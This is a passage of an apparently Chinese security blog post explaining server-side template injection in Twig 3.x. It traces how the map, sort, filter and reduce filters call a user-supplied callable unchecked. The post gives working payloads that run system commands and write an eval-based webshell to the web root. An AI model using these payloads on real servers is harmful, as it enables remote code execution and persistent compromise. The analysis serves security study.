+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">people</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="nx">first</span><span class="o">:</span> <span class="s2">&#34;Bob&#34;</span><span class="p">,</span> <span class="nx">last</span><span class="o">:</span> <span class="s2">&#34;Smith&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span><span class="nx">first</span><span class="o">:</span> <span class="s2">&#34;Alice&#34;</span><span class="p">,</span> <span class="nx">last</span><span class="o">:</span> <span class="s2">&#34;Dupond&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">people</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="nx">p</span> <span class="o">=&gt;</span> <span class="s2">&#34;#{p.first} #{p.last}&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># outputs Bob Smith, Alice Dupond #}
+</span></span></span></code></pre></div><p>同时 <code>arrow function</code> 也可以接受mapping键值对的 <code>key</code> 的内容作为作为第二个参数 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">people</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Bob&#34;</span><span class="o">:</span> <span class="s2">&#34;Smith&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Alice&#34;</span><span class="o">:</span> <span class="s2">&#34;Dupond&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">people</span><span class="o">|</span><span class="nx">map</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="s2">&#34;#{key} #{value}&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># outputs Bob Smith, Alice Dupond #}
+</span></span></span></code></pre></div><p>注意：这里的 <code>arrow_function</code> 是可以访问当前的全局变量 <code>$context</code> 的 <!-- raw HTML omitted -->
+那当我们使用如下例子的时候： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;Mark&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">((</span><span class="nx">arg</span><span class="p">)</span><span class="o">=&gt;</span><span class="s2">&#34;Hello #{arg}!&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></div><p>Twig 3.x 会将其编译成如下php代码： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">twig_array_map</span><span class="p">([</span><span class="mi">0</span> <span class="o">=&gt;</span> <span class="s2">&#34;Mark&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">               <span class="k">function</span> <span class="p">(</span><span class="nv">$__arg__</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$context</span><span class="p">,</span> <span class="nv">$macros</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                   <span class="nv">$context</span><span class="p">[</span><span class="s2">&#34;arg&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$__arg__</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                   <span class="k">return</span> <span class="p">(</span><span class="s2">&#34;hello &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$context</span><span class="p">[</span><span class="s2">&#34;arg&#34;</span><span class="p">]</span> <span class="o">??</span> <span class="k">null</span><span class="p">))})</span>
+</span></span></code></pre></div><ul>
+<li>第一个参数就是经过map处理过的数组参数  [&ldquo;Mark&rdquo;] <!-- raw HTML omitted --></li>
+<li>第二个参数就是一个 <code>arrow function</code>  <!-- raw HTML omitted --></li>
+</ul>
+<p>其中的 <code>twig_array_map</code> 方法的源码如下： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">twig_array_map</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$arrow</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$r</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$r</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arrow</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$k</span><span class="p">);</span>    <span class="c1">// 直接将 $arrow 当做函数执行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$r</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们可以从代码中观察得到： <!-- raw HTML omitted --></p>
+<ul>
+<li>$array = [0 =&gt; &ldquo;Mark&rdquo;] <!-- raw HTML omitted --></li>
+<li>$arrow = function&hellip; <!-- raw HTML omitted --></li>
+<li>$k, $v 就是$array中的key &amp; value <!-- raw HTML omitted --></li>
+<li>并且$arrow直接就不经检查就默认作为函数来进行调用 <!-- raw HTML omitted --></li>
+<li>而$array就被转化为 $arrow函数所需要的两个参数 <!-- raw HTML omitted --></li>
+</ul>
+<p>因此我们自然可以想到如果我们修改 twig_array_map 的两个参数，将 <code>$arrow</code> 改成命令执行函数，同样会被直接当作函数执行，那么就可以实现RCE，而原本的Array就会作为函数的参数配合使用 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">system</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$command</span> <span class="p">[,</span> <span class="nx">int</span> <span class="o">&amp;</span><span class="nv">$return_var</span> <span class="p">]</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">passthru</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$command</span> <span class="p">[,</span> <span class="nx">int</span> <span class="o">&amp;</span><span class="nv">$return_var</span> <span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">exec</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$command</span> <span class="p">[,</span> <span class="k">array</span> <span class="o">&amp;</span><span class="nv">$output</span> <span class="p">[,</span> <span class="nx">int</span> <span class="o">&amp;</span><span class="nv">$return_var</span> <span class="p">]]</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">shell_exec</span> <span class="p">(</span> <span class="nx">string</span> <span class="nv">$cmd</span> <span class="p">)</span> <span class="o">:</span> <span class="nx">string</span>
+</span></span></code></pre></div><p>前三个函数都可以使用，Payload如下： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;passthru&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}</span>    <span class="c1">// 无回显
+</span></span></span></code></pre></div><p>就可以执行 <code>id</code> 命令，输出系统id的信息了 <!-- raw HTML omitted --></p>
+<p>如果命令执行函数都被禁用，还可以尝试其他函数来执行任意代码： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;phpinfo();&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;assert&#34;</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)}}</span> <span class="c1">// assert(&#39;phpinfo();&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">{{{</span><span class="s2">&#34;&lt;?php phpinfo();eval(</span><span class="si">$_POST[whoami]</span><span class="s2">)&#34;</span><span class="o">:</span><span class="s2">&#34;/var/www/html/shell.php&#34;</span><span class="p">}</span><span class="o">|</span><span class="nx">map</span><span class="p">(</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">)}}</span>    <span class="c1">// 写 Webshell
+</span></span></span></code></pre></div><p>我们利用 <code>$arrow</code> 可以不经检查就被直接当作函数来执行的特点，还可以发现其他的几个过滤器也存在相同的问题 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>sort</p>
+<p><code>sort</code> 过滤器可以用来给数组进行排序，介绍详见：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/sort.html"  target="_blank" rel="noopener"
+    >sort</a> <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">user</span> <span class="nx">in</span> <span class="nx">users</span><span class="o">|</span><span class="nx">sort</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div><p>我们同样可以将一个 <code>arrow function</code> 作为参数传入来实现更为复杂的排序方法，这机会不就来了 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">fruits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Apples&#39;</span><span class="p">,</span> <span class="nx">quantity</span><span class="o">:</span> <span class="mi">5</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Oranges&#39;</span><span class="p">,</span> <span class="nx">quantity</span><span class="o">:</span> <span class="mi">2</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Grapes&#39;</span><span class="p">,</span> <span class="nx">quantity</span><span class="o">:</span> <span class="mi">4</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">fruit</span> <span class="nx">in</span> <span class="nx">fruits</span><span class="o">|</span><span class="nx">sort</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">a</span><span class="o">.</span><span class="nx">quantity</span> <span class="o">&lt;=&gt;</span> <span class="nx">b</span><span class="o">.</span><span class="nx">quantity</span><span class="p">)</span><span class="o">|</span><span class="nx">column</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">)</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{{</span> <span class="nx">fruit</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># output in this order: Oranges, Grapes, Apples #}
+</span></span></span></code></pre></div><p>在模板被编译后， <code>sort</code> 过滤器会被转化为 <code>twig_sort_filter</code> 函数，源码如下： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">twig_sort_filter</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$arrow</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$array</span> <span class="nx">instanceof</span> <span class="nx">\Traversable</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$array</span> <span class="o">=</span> <span class="nx">iterator_to_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nx">\is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nx">RuntimeError</span><span class="p">(</span><span class="nx">sprintf</span><span class="p">(</span><span class="s1">&#39;The sort filter only works with arrays or &#34;Traversable&#34;, got &#34;%s&#34;.&#39;</span><span class="p">,</span> <span class="nx">\gettype</span><span class="p">(</span><span class="nv">$array</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">null</span> <span class="o">!==</span> <span class="nv">$arrow</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">uasort</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$arrow</span><span class="p">);</span>    <span class="c1">// 直接被 uasort 调用 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">asort</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-07-01_23-34-07_screenshot.png"
+         alt="Figure 2: uasort 函数测试命令行执行" width="300px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 2: <!-- raw HTML omitted -->uasort 函数测试命令行执行</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>同样可以用来进行远程代码执行，payload如下： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;passthru&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">sort</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}</span>    <span class="c1">// 无回显
+</span></span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>filter</p>
+<p><code>filter</code> 过滤器，原汁原味的过滤器，主要功能就是通过给定条件来筛选数据，详见：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/filter.html"  target="_blank" rel="noopener"
+    >filter</a> <!-- raw HTML omitted --></p>
+<p><code>filter</code> 过滤器可以通过传入一个 <code>arrow function</code> 来规定想要的数据的范围 <!-- raw HTML omitted --></p>
+<p>下面的例子就是通过filter过滤器来选出数组中大于38的值 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">sizes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">34</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">42</span><span class="p">]</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">sizes</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="nx">v</span> <span class="o">=&gt;</span> <span class="nx">v</span> <span class="o">&gt;</span> <span class="mi">38</span><span class="p">)</span><span class="o">|</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;, &#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># output 40, 42 #}
+</span></span></span></code></pre></div><p>作用于map <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">sizes</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">xs</span><span class="o">:</span> <span class="mi">34</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">s</span><span class="o">:</span>  <span class="mi">36</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">m</span><span class="o">:</span>  <span class="mi">38</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">l</span><span class="o">:</span>  <span class="mi">40</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">xl</span><span class="o">:</span> <span class="mi">42</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">v</span> <span class="nx">in</span> <span class="nx">sizes</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="nx">v</span> <span class="o">=&gt;</span> <span class="nx">v</span> <span class="o">&gt;</span> <span class="mi">38</span><span class="p">)</span> <span class="o">-%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{{</span> <span class="nx">k</span> <span class="p">}}</span> <span class="o">=</span> <span class="p">{{</span> <span class="nx">v</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># output l = 40 xl = 42 #}
+</span></span></span></code></pre></div><p>同样可以将map中的键值对中的key拿出来作为 <code>arrow_function</code> 的第二个参数 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">v</span> <span class="nx">in</span> <span class="nx">sizes</span><span class="o">|</span><span class="nx">filter</span><span class="p">((</span><span class="nx">v</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">v</span> <span class="o">&gt;</span> <span class="mi">38</span> <span class="k">and</span> <span class="nx">k</span> <span class="o">!=</span> <span class="s2">&#34;xl&#34;</span><span class="p">)</span> <span class="o">-%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{{</span> <span class="nx">k</span> <span class="p">}}</span> <span class="o">=</span> <span class="p">{{</span> <span class="nx">v</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">endfor</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># output l = 40 #}
+</span></span></span></code></pre></div><p>那么filter过滤器在经过了编译之后会得到 <code>twig_array_filter</code> 函数，同样会调用  <code>array_filter</code> 来直接调用 <code>$arrow</code> ： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">twig_array_filter</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$arrow</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">\is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">array_filter</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$arrow</span><span class="p">,</span> <span class="nx">\ARRAY_FILTER_USE_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="k">new</span> <span class="nx">\CallbackFilterIterator</span><span class="p">(</span><span class="k">new</span> <span class="nx">\IteratorIterator</span><span class="p">(</span><span class="nv">$array</span><span class="p">),</span> <span class="nv">$arrow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们可以看到这里传入的 $array 以及 $arrow 直接被 <code>array_filter</code> 函数调用： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">array_filter</span><span class="p">(</span><span class="k">array</span> <span class="nv">$array</span><span class="p">,</span> <span class="o">?</span><span class="nx">callable</span> <span class="nv">$callback</span> <span class="o">=</span> <span class="k">null</span><span class="p">,</span> <span class="nx">int</span> <span class="nv">$mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">)</span><span class="o">:</span> <span class="k">array</span>
+</span></span></code></pre></div><p>array_filter的前两个参数分别为 <!-- raw HTML omitted --></p>
+<ol>
+<li>array，用来遍历的数组 <!-- raw HTML omitted --></li>
+<li>callback,用来执行的回调函数 <!-- raw HTML omitted --></li>
+</ol>
+<p>也就是说这里$arrow直接可以配合$array进行执行 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-07-01_23-29-52_screenshot.png"
+         alt="Figure 3: array_filter 函数测试命令行执行" width="300px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->array_filter 函数测试命令行执行</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>因此也可以payload于之前类似 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;passthru&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{[</span><span class="s2">&#34;id&#34;</span><span class="p">]</span><span class="o">|</span><span class="nx">filter</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}</span>    <span class="c1">// 无回显
+</span></span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>reduce</p>
+<p><code>reduce</code> 过滤器将对数组进行处理，通过一个 <code>arrow_function</code> 来定义操作的规则，迭代地将数组中的元素进行合并直至一个元素，详见官方文档：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/reduce.html"  target="_blank" rel="noopener"
+    >reduce</a> <!-- raw HTML omitted --></p>
+<p>比如就可以将数组中所有的元素相加 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">set</span> <span class="nx">numbers</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">]</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">numbers</span><span class="o">|</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">carry</span><span class="p">,</span> <span class="nx">v</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">carry</span> <span class="o">+</span> <span class="nx">v</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="c1"># output 6 #}
+</span></span></span></code></pre></div><p>那么在经过编译之后就会转为利用 <code>twig_array_reduce</code> 方法 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">twig_array_reduce</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$arrow</span><span class="p">,</span> <span class="nv">$initial</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">\is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$array</span> <span class="o">=</span> <span class="nx">iterator_to_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">array_reduce</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span> <span class="nv">$arrow</span><span class="p">,</span> <span class="nv">$initial</span><span class="p">);</span>    <span class="c1">// $array, $arrow 和 $initial 直接被 array_reduce 函数调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>其中的 <code>array_reduce</code> 方法同样也也将 $arrow 作为回调函数直接执行，并将 $array 作为参数带入 <!-- raw HTML omitted --></p>
+<p><figure><img src="/ox-hugo/2022-07-01_23-40-14_screenshot.png"
+         alt="Figure 4: array_reduce 函数测试命令行调用" width="300px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 4: <!-- raw HTML omitted -->array_reduce 函数测试命令行调用</p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>那么payload同样也是类似的，不过这里要传入的参数需要包含至少两个，这样才符合两个操作值： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span><span class="o">|</span><span class="nx">reduce</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
